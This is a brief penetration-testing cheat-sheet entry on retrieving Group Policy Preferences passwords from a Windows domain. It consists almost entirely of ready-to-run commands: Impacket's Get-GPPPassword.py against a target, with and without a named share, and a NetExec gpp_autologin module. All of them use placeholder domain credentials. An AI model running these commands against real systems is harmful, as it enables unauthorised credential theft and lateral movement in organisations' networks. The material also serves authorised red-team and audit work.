# GPPPassword and GPP Autologin

Find and decrypt Group Policy Preferences passwords.

    Get-GPPPassword.py domain.local/user1:password@<target>
    
##### Specific share

    Get-GPPPassword.py -share <share> domain.local/user1:password@<target>

##### GPP autologin

    nxc smb <target> -u user1 -p password -M gpp_autologin
